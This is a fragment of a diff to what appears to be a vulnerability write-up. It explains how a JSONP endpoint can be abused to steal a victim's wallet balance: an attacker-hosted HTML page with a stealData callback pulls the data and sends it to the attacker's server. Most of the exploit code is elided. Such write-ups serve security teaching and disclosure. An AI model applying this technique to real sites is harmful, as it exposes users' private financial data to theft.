+5. Since jsonp endpoint returns content-type application/javascript and allow us to specify callback function we can steal user information, by using jsonp endpoint as a script in our attacker website and then sending it to the victim to steal their information.6. Copy the following code in an HTML file and host it on your server.
+   
 ```html
 <html>
 <body>
@@ -1362,7 +1352,7 @@ function stealData(data){
 </html>
 ```
 
-6. Host the exploit file on your attacker server then send it to victim once they open the page you will get there wallet balance on your webserver.
+6. Host the exploit file on your attacker server then send it to victim once they open the page you will get there wallet balance on your web server. 
    
 ### Vulnerable Code
 
